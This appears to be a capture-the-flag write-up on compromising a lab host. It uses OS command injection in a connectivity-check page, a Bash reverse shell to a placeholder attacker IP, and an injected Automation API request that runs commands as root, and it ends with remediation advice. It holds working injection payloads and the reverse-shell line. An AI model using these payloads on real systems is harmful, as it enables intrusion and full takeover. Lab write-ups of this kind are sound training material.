Objective

  • Obtain the User Flag
  • Obtain the Root Flag

Discovering the Hidden Endpoint

Browsing to:

http://<TARGET-IP>/status
http://<TARGET-IP>/status

revealed a Sister-property Connectivity page.

The application accepted a hostname/IP address and performed a connectivity check, suggesting that a system command such as ping was being executed on the backend.

This indicated a potential OS Command Injection vulnerability.

Command Injection

Several payloads were tested.

127.0.0.1;id
127.0.0.1;id
127.0.0.1$(id)
127.0.0.1$(id)
127.0.0.1;id;#
127.0.0.1;id;#

The application returned the output of the injected commands, confirming successful OS Command Injection.

The user flag could even be read directly through the vulnerable parameter.

127.0.0.1;id && pwd && ls && cat user.txt
127.0.0.1;id && pwd && ls && cat user.txt

Reverse Shell

A Netcat listener was started.

nc -lvnp 5456
nc -lvnp 5456

A Bash reverse shell payload was injected.

127.0.0.1;/bin/bash -c '/bin/bash -i >& /dev/tcp/<ATTACKER-IP>/5456 0>&1'
127.0.0.1;/bin/bash -c '/bin/bash -i >& /dev/tcp/<ATTACKER-IP>/5456 0>&1'

The target connected back successfully, providing an interactive shell as the web user.

FreePBX Authentication

Using the credentials recovered from /api/config, authentication to the FreePBX User Control Panel (UCP) was successful.

After logging in, a valid Bearer Token for the Automation API was obtained.

Privilege Escalation

The Automation service exposed an authenticated endpoint used to generate reports.

A crafted request was sent using the recovered Bearer token.

curl -sS \
-X POST \
http://127.0.0.1:9000/jobs/export \
-H "Authorization: Bearer <TOKEN>" \
-H "Content-Type: application/json" \
--data-binary '{"report":"test;id;#"}'
curl -sS \
-X POST \
http://127.0.0.1:9000/jobs/export \
-H "Authorization: Bearer <TOKEN>" \
-H "Content-Type: application/json" \
--data-binary '{"report":"test;id;#"}'

Response:

uid=0(root)
gid=0(root)
groups=0(root)
uid=0(root)
gid=0(root)
groups=0(root)

This confirmed that the report parameter was vulnerable to OS Command Injection, allowing arbitrary commands to execute with root privileges.

Remediation

  • Validate and sanitize all user-supplied input before executing system commands.
  • Replace shell command execution with secure API or library calls wherever possible.
  • Implement strict input allowlisting for hostname and IP address validation.
  • Protect administrative endpoints with proper authentication and authorization.
  • Remove sensitive developer comments and internal endpoint references from client-side code.
  • Prevent configuration endpoints from exposing credentials or internal service details.
  • Remove default or hard-coded credentials and enforce strong password policies.
  • Upgrade FreePBX to a patched version that addresses CVE-2026-46378.
  • Apply the principle of least privilege to services and application accounts.
  • Avoid running application services with root privileges unless absolutely necessary.
  • Validate and sanitize all Automation API parameters to prevent command injection.
  • Restrict localhost services using network segmentation and firewall rules.
  • Enable centralized logging and monitoring to detect exploitation attempts.
  • Perform regular vulnerability assessments and timely security patching.
